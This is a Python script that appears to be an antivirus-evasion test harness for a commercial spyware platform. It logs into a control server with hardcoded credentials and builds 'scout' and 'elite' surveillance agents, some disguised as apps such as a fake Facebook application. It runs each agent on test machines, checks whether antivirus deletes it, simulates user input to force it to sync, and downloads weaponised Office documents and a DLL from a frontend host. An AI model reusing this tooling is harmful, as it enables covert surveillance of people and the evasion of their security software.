import os
import shutil
from time import sleep
import time
import socket
import urllib2
import zipfile
import os.path
import re
import traceback
import subprocess
import Queue
import threading
import argparse
import itertools
import random
from ConfigParser import ConfigParser
from urllib2 import HTTPError
import ctypes

from rcs_client import Rcs_client
from AVCommon.logger import logging
from AVCommon import process

MOUSEEVENTF_MOVE = 0x0001  # mouse move
MOUSEEVENTF_ABSOLUTE = 0x8000  # absolute move
MOUSEEVENTF_MOVEABS = MOUSEEVENTF_MOVE + MOUSEEVENTF_ABSOLUTE

MOUSEEVENTF_LEFTDOWN = 0x0002  # left button down
MOUSEEVENTF_LEFTUP = 0x0004  # left button up
MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP

names = ['BTHSAmpPalService','CyCpIo','CyHidWin','iSCTsysTray','quickset','agent']
start_dirs = ['C:/Users/avtest/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup',
            'C:/Documents and Settings/avtest/Start Menu/Programs/Startup', 'C:/Users/avtest/Desktop']

def unzip(filename, fdir):
    zfile = zipfile.ZipFile(filename)
    names = []
    for name in zfile.namelist():
        (dirname, filename) = os.path.split(name)
        logging.debug("- Decompress: %s / %s" % (fdir, filename))
        zfile.extract(name, fdir)
        names.append('%s/%s' % (fdir, name))
    return names


def check_static(files, report = None):
    global report_send
    if report:
        report_send = report

    success = []
    failed = []
    for src in files:
        logging.debug("DBG: check_static: %s" % src)
        dst = "%s.copy.exe" % src

        if os.path.exists(src):
            logging.debug("Copying %s to %s" % (src, dst))
            try:
                shutil.copy(src, dst)
            except Exception, ex:
                logging.exception("Exception file: %s" % src)

    time.sleep(15)
    for src in files:
            if not os.path.exists(src):
                failed.append(src)
                logging.error("Not existent file: %s" % src)
            else:
                if os.path.exists(dst) and os.path.exists(src):
                    success.append(src)
                    logging.debug("succesful copy %s to %s" % (src, dst))
                else:
                    logging.error("cannot copy")
                    failed.append(src)


    if not failed:
        add_result("+ SUCCESS CHECK_STATIC: %s" % success)
    else:
        add_result("+ FAILED CHECK_STATIC. SIGNATURE DETECTION: %s" % failed)
    return failed


def internet_on():
    ips = ['87.248.112.181', '173.194.35.176', '176.32.98.166',
           'www.reddit.com', 'www.bing.com', 'www.facebook.com', 'stackoverflow.com']
    q = Queue.Queue()
    for i in ips:
        t = threading.Thread(target=check_internet, args=(i, q))
        t.daemon = True
        t.start()

    s = [q.get() for i in ips]
    return any(s)


def check_internet(address, queue):
    """ True if dns or http are reachable """
    logging.debug("- Check connection: %s" % address)

    ret = False
    try:
        if (ret is False):
            response = urllib2.urlopen('http://' + address, timeout=5)
            # logging.debug("i reach url: ", address)
            ret |= True
    except:
        ret |= False

    queue.put(ret)

class connection:
    host = ""
    user = "avmonitor"
    passwd = "avmonitorp123"
    operation = 'AVMonitor'
    rcs=[]

    def __enter__(self):
        logging.debug("DBG login %s@%s" % (self.user, self.host))
        assert connection.host
        self.conn = Rcs_client(connection.host, connection.user, connection.passwd)
        self.conn.login()
        return self.conn

    def __exit__(self, type, value, traceback):
        logging.debug("DBG logout")
        self.conn.logout()

def get_target_name():
    return 'VM_%s' % get_hostname()

def get_hostname():
    host = socket.gethostname()
    drop = ["winxp","win7","win8"]
    for d in drop:
        host = host.replace(d, "")

    return host

class AgentBuild:
    def __init__(self, backend, frontend=None, platform='windows', kind='silent',
                 ftype='desktop', blacklist=[], param=None):
        self.kind = kind
        self.host = (backend, frontend)

        self.hostname = get_hostname()

        self.blacklist = blacklist
        self.platform = platform
        self.ftype = ftype
        self.param = param
        logging.debug("DBG blacklist: %s" % self.blacklist)
        logging.debug("DBG hostname: %s" % self.hostname)

    def _delete_targets(self, operation):
        numtarget = 0
        with connection() as c:
            operation_id, group_id = c.operation(operation)
            logging.debug("operation_id: %s" % operation_id)
            targets = c.targets(operation_id)
            for t_id in targets:
                logging.debug("- Delete target: %s" % t_id)
                c.target_delete(t_id)
                numtarget += 1
        return numtarget

    def _create_new_factory(self, operation, target, factory, config):
        with connection() as c:
            assert c
            if not c.logged_in():
                logging.warn("Not logged in")
            logging.debug(
                "DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)

            operation_id, group_id = c.operation(operation)
            if not operation_id:
                raise RuntimeError("Cannot get operations")

            # gets all the target with our name in an operation
            targets = c.targets(operation_id, target)

            if len(targets) > 0:
                # keep only one target
                for t in targets[1:]:
                    c.target_delete(t)

                target_id = targets[0]

                agents = c.agents(target_id)

                for agent_id, ident, name in agents:
                    logging.debug("DBG   %s %s %s" % (agent_id, ident, name))
                    if name.startswith(factory):
                        logging.debug("- Delete instance: %s %s" % (ident, name))
                        c.instance_delete(agent_id)
            else:
                logging.debug("- Create target: %s" % target)
                target_id = c.target_create(
                    operation_id, target, 'made by vmavtest at %s' % time.ctime())

            factory_id, ident = c.factory_create(
                operation_id, target_id, self.ftype, factory,
                'made by vmavtestat at %s' % time.ctime()
            )

            with open(config) as f:
                conf = f.read()

            conf = re.sub(
                r'"host": ".*"', r'"host": "%s"' % self.host[1], conf)
            c.factory_add_config(factory_id, conf)

            with open('build/config.actual.json', 'wb') as f:
                f.write(conf)

            return (target_id, factory_id, ident)

    def _build_agent(self, factory, melt=None, kind="silent",tries=0):
        with connection() as c:

            try:
                # TODO: togliere da qui, metterla in procedures
                filename = 'build/%s/build.zip' % self.platform
                if os.path.exists(filename):
                    os.remove(filename)

                if kind=="melt" and melt:
                    logging.debug("- Melt build with: %s" % melt)
                    appname = "exp_%s" % self.hostname
                    self.param['melt']['appname'] = appname
                    self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                    if 'deliver' in self.param:
                        self.param['deliver']['user'] = c.myid
                    r = c.build_melt(factory, self.param, melt, filename)
                else:
                    logging.debug("- Silent build")
                    r = c.build(factory, self.param, filename)

                contentnames = unzip(filename, "build/%s" % self.platform)

                # CHECK FOR DELETED FILES
                failed = check_static(contentnames)

                if not failed:
                    add_result("+ SUCCESS SCOUT BUILD")
                    return contentnames
                else:
                    add_result("+ FAILED SCOUT BUILD. SIGNATURE DETECTION: %s" % failed)
                    raise RuntimeError("Signature detection")

            except HTTPError as err:
                logging.debug("DBG trace %s" % traceback.format_exc())
                if tries <= 3:
                    tries += 1
                    logging.debug("DBG problem building scout. tries number %s" % tries)
                    return self._build_agent(factory, melt, kind, tries)
                else:
                    add_result("+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries)
                    raise err
            except Exception, e:
                logging.debug("DBG trace %s" % traceback.format_exc())
                add_result("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")

                raise e

    def _execute_build(self, exenames):
        try:
            exe = exenames[0]
            if exe == "build/agent.exe":
                new_exe = "build/SNZEHJJG.exe"
                os.rename(exe, new_exe)
                exe = new_exe

            logging.debug("- Execute: " + exe)
            subp = subprocess.Popen([exe]) #, shell=True)
            add_result("+ SUCCESS SCOUT EXECUTE")
        except Exception, e:
            logging.debug("DBG trace %s" % traceback.format_exc())
            add_result("+ FAILED SCOUT EXECUTE")

            raise e

    def _click_mouse(self, x, y):
    # move first
        x = 65536L * x / ctypes.windll.user32.GetSystemMetrics(0) + 1
        y = 65536L * y / ctypes.windll.user32.GetSystemMetrics(1) + 1
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_MOVEABS, x, y, 0, 0)
        # then click
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_CLICK, 0, 0, 0, 0)

    def _trigger_sync(self, timeout=10):
        subp = subprocess.Popen(['assets/keyinject.exe'])
        process.wait_timeout(subp, timeout)

    def check_instance(self, ident):
        with connection() as c:
            instances = c.instances(ident)
            logging.debug("DBG instances: %s" % instances)
            logging.debug("DBG rcs: %s" % str(connection.rcs))

            assert len(instances) <= 1, "too many instances"

            if len(instances) == 1:
                add_result("+ SUCCESS SCOUT SYNC")
                c.instance = instances[0]
                return instances[0]
            elif len(instances) > 1:
                add_result("+ FAILED SCOUT SYNC, TOO MANY INSTANCES")
                c.instance = instances[0]
                return instances[0]

            add_result("+ NO SCOUT SYNC")
            # self._
            return None

    def _check_elite(self, instance_id):
        with connection() as c:
            info = c.instance_info(instance_id)
            logging.debug('DBG _check_elite %s' % info)
            ret = info['upgradable'] is False and info['scout'] is False

            if ret:
                add_result("+ SUCCESS ELITE SYNC")
            else:
                add_result("+ NOT YET ELITE SYNC")

            return ret

    def uninstall(self, instance_id):
        with connection() as c:
            c.instance_close(instance_id)

    def _upgrade_elite(self, instance_id):
        with connection() as c:
            ret = c.instance_upgrade(instance_id)
            logging.debug("DBG _upgrade_elite: %s" % ret)
            info = c.instance_info(instance_id)
            if ret:
                #assert info['upgradable'] == True
                assert info['scout'] is True
            else:
                #assert info['upgradable'] == False
                assert info['scout'] is True
            return ret

    def _list_processes(self):
        return subprocess.Popen(["tasklist"], stdout=subprocess.PIPE).communicate()[0]

    def server_errors(self):
        with connection() as c:
            return c.server_status()['error']

    def create_user_machine(self):
        logging.debug("create_user_machine")
        privs = [
            'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT',
            'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP',
            'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
            'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD',
            'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM',
            'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
        user_name = "avmonitor_%s" % self.hostname
        connection.user = user_name

        user_exists = False
        try:
            with connection() as c:
                logging.debug("LOGIN SUCCESS")
                user_exists = True
        except:
            pass

        if not user_exists:
            connection.user = "avmonitor"
            with connection() as c:
                ret = c.operation(connection.operation)
                op_id, group_id = ret
                c.user_create(user_name, connection.passwd, privs, group_id)
        connection.user = user_name
        return True

    def execute_elite(self):
        """ build scout and upgrade it to elite """
        instance_id = self.execute_scout()
        self.execute_elite_fast(instance_id, False)

    def execute_elite_fast(self, instance_id = None, fast = True):

        if not instance_id:
            with connection() as c:
                instance_id, target_id = get_instance(c)
        if not instance_id:
            logging.debug("- exiting execute_elite_fast because did't sync")
            return

        logging.debug("- Try upgrade to elite")
        upgradable = self._upgrade_elite(instance_id)

        logging.debug("DBG %s in %s" % (self.hostname, self.blacklist))
        if not upgradable:
            if self.hostname in self.blacklist:
                add_result("+ SUCCESS ELITE BLACKLISTED")
            else:
                add_result("+ FAILED ELITE UPGRADE")
            return
        else:
            if self.hostname in self.blacklist:
                add_result("+ FAILED ELITE BLACKLISTED")
                return

        if fast:
            logging.debug("- Elite, Wait for 5 minutes: %s" % time.ctime())
            sleep(5 * 60)
            # key press
            for tries in range(1, 10):
                logging.debug("- Elite, Trigger sync for 30 seconds, try %s" % tries)
                self._trigger_sync(timeout=30)

                logging.debug("- Elite, wait for 1 minute: %s" % time.ctime())
                sleep(60 * 1)

                elite = self._check_elite(instance_id)
                if elite:
                    break

                for i in range(10):
                    self._click_mouse(100 + i, 0)

        else:
            logging.debug("- Elite, Wait for 25 minutes: %s" % time.ctime())
            sleep(25 * 60)
            elite = self._check_elite(instance_id)

        if elite:
            add_result("+ SUCCESS ELITE INSTALL")
            logging.debug("- Elite, wait for 1 minute then uninstall: %s" % time.ctime())
            sleep(60)
            self.uninstall(instance_id)
            sleep(60)
            add_result("+ SUCCESS ELITE UNINSTALLED")
        else:
            output = self._list_processes()
            logging.debug(output)
            add_result("+ FAILED ELITE INSTALL")

        logging.debug("- Result: %s" % elite)
        logging.debug("- sending Results to Master")

    def execute_scout(self):
        """ build and execute the  """
        factory_id, ident, exe = self.execute_pull()

        self._execute_build(exe)
        if self.kind == "melt": # and not exploit
            sleep(60)
            executed = False
            for d,b in itertools.product(start_dirs,names):
                filename = "%s/%s.exe" % (d,b)
                filename = filename.replace("/","\\")
                if os.path.exists(filename):
                    try:
                        logging.debug("try to execute %s: " % filename)
                        subprocess.Popen([filename])
                        executed = True
                        break
                    except:
                        logging.exception("Cannot execute %s" % filename)

            if not executed:
                logging.warn("did'n executed")
                add_result("+ WARN did not drop startup")

        logging.debug("- Scout, Wait for 5 minutes: %s" % time.ctime())
        sleep(300)

        for tries in range(1, 10):
            logging.debug("- Scout, Trigger sync for 30 seconds, try %s" % tries)
            self._trigger_sync(timeout=30)

            logging.debug("- Scout, wait for 1 minute: %s" % time.ctime())
            sleep(60 * 1)

            instance = self.check_instance(ident)
            if instance:
                break

            for i in range(10):
                self._click_mouse(100 + i, 0)

        if not instance:
            add_result("+ FAILED SCOUT SYNC")
            output = self._list_processes()
            logging.debug(output)
        else:
            if self.kind == "melt":
                try:
                    found = False
                    for d,b in itertools.product(start_dirs,names):
                        filename = "%s/%s.exe" % (d,b)
                        filename = filename.replace("/","\\")
                        if os.path.exists(filename):
                           found = True

                    if not found:
                        logging.warn("did'n executed")
                        add_result("+ FAILED NO STARTUP")
                except:
                    pass

        logging.debug("- Result: %s" % instance)
        return instance

    def execute_pull(self):
        """ build and execute the  """

        logging.debug("- Host: %s %s\n" % (self.hostname, time.ctime()))
        operation = connection.operation
        target = get_target_name()
        # desktop_exploit_melt, desktop_scout_
        factory = '%s_%s_%s_%s' % (
            self.hostname, self.ftype, self.platform, self.kind)
        config = "assets/config_%s.json" % self.ftype

        if not os.path.exists('build'):
            os.mkdir('build')
        if not os.path.exists('build/%s' % self.platform):
            os.mkdir('build/%s' % self.platform)
        target_id, factory_id, ident = self._create_new_factory(
            operation, target, factory, config)

        connection.rcs=(target_id, factory_id, ident, operation, target, factory)

        logging.debug("- Built, rcs: %s" % str(connection.rcs))

        #        add_result("+ platfoooorm %s" % self.platform)
        #        add_result("+ kiiiiiiiind %s" % self.kind)

        meltfile = self.param.get('meltfile',None)
        exe = self._build_agent(factory_id, melt=meltfile, kind=self.kind)

        if "exploit_" in self.platform:
            if self.platform == 'exploit_docx':
                appname = "exp_%s/avtest.swf" % self.hostname
            elif self.platform == 'exploit_ppsx':
                appname = "pexp_%s/avtest.swf" % self.hostname
            elif self.platform == 'exploit_web':
                dllname = "exp_%s/PMIEFuck-WinWord.dll" % self.hostname
                docname = "exp_%s/owned.docm" % self.hostname

            url = "http://%s/%s" % (self.host[1], appname)
            logging.debug("DBG getting: %s" % url)
            done = False
            try:
                u = urllib2.urlopen(url)
                localFile = open('build/file.swf', 'w')
                localFile.write(u.read())
                localFile.close()
                sleep(2)
                with open('build/file.swf'):
                    done = True
                if "exploit_web" in self.platform:
                    url = "http://%s/%s" % (self.host[1], docname)
                    u = urllib2.urlopen(url)
                    docFile = open('build/owned.docm', 'w')
                    docFile.write(u.read())
                    docFile.close()
                    sleep(2)
                    with open('build/owned.docm'):
                        done = True
                    url = "http://%s/%s" % (self.host[1], dllname)
                    u = urllib2.urlopen(url)
                    docFile = open('build/PMIEFuck-WinWord.dll', 'w')
                    docFile.write(u.read())
                    docFile.close()
                    sleep(2)
                    with open('build/PMIEFuck-WinWord.dll'):
                        done = True
                if done == True:
                    add_result("+ SUCCESS EXPLOIT SAVE")
            except urllib2.HTTPError:
                add_result("+ ERROR EXPLOIT DOWNLOAD")
                pass
            except IOError:
                add_result("+ FAILED EXPLOIT SAVE")
                pass

        return factory_id, ident, exe

    def execute_web_expl(self, websrv):
        """ WEBZ: we need to download some files only """

        def check_file(filename):
            try:
                with open(filename):
                    logging.debug("DBG %s saved" % filename)
                    return True
            except IOError:
                logging.debug("DBG failed saving %s" % appname)
                return False

        appname = ""
        done = True
        filez = ["assets/windows/avtest.swf", "assets/windows/owned.docm",
                 "assets/windows/PMIEFuck-WinWord.dll"]

        for appname in filez:
            if check_file(appname) is False:
                done = False
                break
        if done is True:
            add_result("+ SUCCESS EXPLOIT SAVE")
        else:
            add_result("+ FAILED EXPLOIT SAVE")


results = []
report_send = None

def add_result(result):
    global results, report_send
    logging.debug(result)
    results.append(result)
    if report_send:
        report_send(result)


internet_checked = False

# args: platform_type, backend, frontend, kind, blacklist
def execute_agent(args, level, platform):
    """ starts the vm and execute elite,scout or pull, depending on the level """
    global internet_checked

    ftype = args.platform_type
    logging.debug("DBG ftype: %s" % ftype)

    vmavtest = AgentBuild(args.backend, args.frontend,
                          platform, args.kind, ftype, args.blacklist, args.param)

    """ starts a scout """
    if socket.gethostname().lower() not in ['zanzara.local', 'win7zenoav', 'win7-noav', "paradox", "avtagent", "funff", "funie", "funch"]:
        if not internet_checked and internet_on():
            add_result("+ ERROR: I reach Internet")
            return False

    internet_checked = True
    logging.debug("- Network unreachable")
    logging.debug("- Server: %s/%s %s" % (args.backend, args.frontend, args.kind))

    if platform == "exploit_web":
        vmavtest.execute_web_expl(args.frontend)
    else:
        if vmavtest.create_user_machine():
            add_result("+ SUCCESS USER CONNECT")
            if vmavtest.server_errors():
                add_result("+ WARN SERVER ERRORS")

            add_result("+ SUCCESS SERVER CONNECT")
            action = {"elite": vmavtest.execute_elite, "scout":
                vmavtest.execute_scout, "pull": vmavtest.execute_pull, "elite_fast": vmavtest.execute_elite_fast }
            sleep(5)
            action[level]()

        else:
            add_result("+ ERROR USER CREATE")

    return True

def get_instance(client):
    operation_id, group_id = client.operation('AVMonitor')
    target = get_target_name()

    targets = client.targets(operation_id, target)
    if len(targets) != 1:
        return False, "not one target: %s" % len(targets)

    target_id = targets[0]
    instances = client.instances_by_target_id(target_id)
    logging.debug("found these instances: %s" % instances)
    if len(instances) != 1:
        return False, "not one instance: %s" % len(instances)

    instance = instances[0]
    instance_id = instance['_id']
    target_id = instance['path'][1]

    return instance_id, target_id

def check_evidences(backend, type_ev, key, value):
    connection.host = backend

    logging.debug("type_ev: %s, filter: %s=%s" % (type_ev, key, value))
    number = 0

    with connection() as client:
        logging.debug("connected")

        instance_id, target_id = get_instance(client)
        if not instance_id:
            return False, target_id

        evidences = client.evidences(target_id, instance_id, "type", type_ev)

        if key:
            for ev in evidences:
                #content = ev['data']['content']
                logging.debug("got evidence: %s" % ev)

                v = ev['data'][key]
                if v == value:
                    number+=1
                    logging.debug( "evidence %s: %s -> %s" %(type_ev, key, value))
        else:
            number = len(evidences)
    return number > 0, number

def check_blacklist(blacklist):
    with connection() as client:
        logging.debug("connected")
        blacklist_server = client.blacklist()
        logging.info("blacklist from server: %s" % blacklist_server)
        logging.info("blacklist from conf: %s" % blacklist)
        report_send("+ BLACKLIST: %s" % blacklist_server)

def uninstall(backend):
    logging.debug("- Clean Server: %s" % (backend))
    connection.host = backend

    target = get_target_name()
    logging.debug("target: %s" % (target))

    with connection() as client:
        logging.debug("connected")

        operation_id, group_id = client.operation('AVMonitor')
        targets = client.targets(operation_id, target)
        if len(targets) != 1:
            return False, "not one target: %s" % len(targets)

        target_id = targets[0]
        instances = client.instances_by_target_id(target_id)
        logging.debug("found these instances: %s" % instances)
        if len(instances) != 1:
            logging.warn("more than one instance")

        for instance in instances:
            instance_id = instance['_id']
            target_id = instance['path'][1]
            logging.debug('closing instance: %s' % instance)
            client.instance_close(instance_id)
        return True, "Instance closed"

def clean(backend):
    logging.debug("- Clean Server: %s" % (backend))
    connection.host = backend
    vmavtest = AgentBuild(backend)
    return vmavtest._delete_targets(connection.operation)


def build(action, platform, platform_type, kind, param, backend, frontend, blacklist, report):
    global results, report_send
    results = []

    class Args:
        pass

    args = Args()

    args.action = action
    args.platform = platform
    args.kind = kind
    args.backend = backend
    args.frontend = frontend
    args.param = param
    args.blacklist = blacklist
    args.platform_type = platform_type
    report_send = report

    connection.host = args.backend

    if report_send:
        report_send("+ INIT %s, %s, %s" % (action, platform, kind))

    try:
        #check_blacklist(blacklist)

        if action in ["pull", "scout", "elite", "elite_fast"]:
            execute_agent(args, action, args.platform)
        elif action == "clean":
            clean(args.backend)
        else:
            add_result("+ ERROR, Unknown action %s, %s, %s" % (action, platform, kind))
    except Exception as ex:
        logging.exception("executing agent: %s" % action)
        add_result("+ ERROR: %s" % str(ex))

    errors =  [ b for b in results if b.startswith("+ ERROR") or b.startswith("+ FAILED")]
    success = not any(errors)

    if report_send:
        report_send("+ END %s %s" % (action, success))

    return results, success, errors


def main():
    parser = argparse.ArgumentParser(description='AVMonitor avtest.')

    #'elite'
    parser.add_argument(
        'action', choices=['scout', 'elite', 'internet', 'test', 'clean', 'pull'])
    parser.add_argument('-p', '--platform', default='windows')
    parser.add_argument('-b', '--backend')
    parser.add_argument('-f', '--frontend')
    parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help="Verbose")

    #parser.set_defaults(blacklist=blacklist)
    #parser.set_defaults(platform_type=platform_type)

    args = parser.parse_args()
    if "winxp" in socket.gethostname():
        avname = socket.gethostname().replace("winxp", "").lower()
    elif "win7" in socket.gethostname():
        avname = socket.gethostname().replace("win7", "").lower()
    else:
        avname = socket.gethostname().replace("win8", "").lower()

    platform_mobile = ["android", "blackberry", "ios"]


    blacklist = "bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32,iobit32".split(',')
    demo = False

    params = {}
    params['blackberry'] = {
        'platform': 'blackberry',
        'binary': {'demo': demo},
        'melt': {'appname': 'facebook',
                 'name': 'Facebook Application',
                 'desc': 'Applicazione utilissima di social network',
                 'vendor': 'face inc',
                 'version': '1.2.3'},
        'package': {'type': 'local'}}
    params['windows'] = {
        'platform': 'windows',
        'binary': {'demo': demo, 'admin': False},
        'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
        'sign': {}
    }
    params['android'] = {
        'platform': 'android',
        'binary': {'demo': demo, 'admin': False},
        'sign': {},
        'melt': {}
    }
    params['linux'] = {
        'platform': 'linux',
        'binary': {'demo': demo, 'admin': False},
        'melt': {}
    }
    params['osx'] = {'platform': 'osx',
                     'binary': {'demo': demo, 'admin': True},
                     'melt': {}
    }
    params['ios'] = {'platform': 'ios',
                     'binary': {'demo': demo},
                     'melt': {}
    }

    params['exploit'] = {"generate":
                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                              "exploit": "HT-2012-001",
                              "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit",
                         "deliver": {"user": "USERID"},
                         "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
                                  "input": "000"}, "factory": {"_id": "000"}
    }

    params['exploit_docx'] = {"generate":
                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                                   "exploit": "HT-2013-002",
                                   "melt": {"demo": False, "scout": True, "admin": False}},
                              "platform": "exploit", "deliver": {"user": "USERID"},
                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
    }
    params['exploit_ppsx'] = {"generate":
                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                                   "exploit": "HT-2013-003",
                                   "melt": {"demo": False, "scout": True, "admin": False}},
                              "platform": "exploit", "deliver": {"user": "USERID"},
                              "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000",
                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
    }
    params['exploit_web'] = {"generate":
                                 {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                                  "exploit": "HT-2013-002",
                                  "melt": {"demo": False, "scout": True, "admin": False}},
                             "platform": "exploit", "deliver": {"user": "USERID"},
                             "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
                                      "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
    }

    p_t = "desktop"
    if args.platform in platform_mobile:
        p_t = "mobile"
    build(args.action, args.platform, p_t, args.kind,
          params[args.platform], args.backend,
          args.frontend, blacklist, None)


if __name__ == "__main__":
    main()
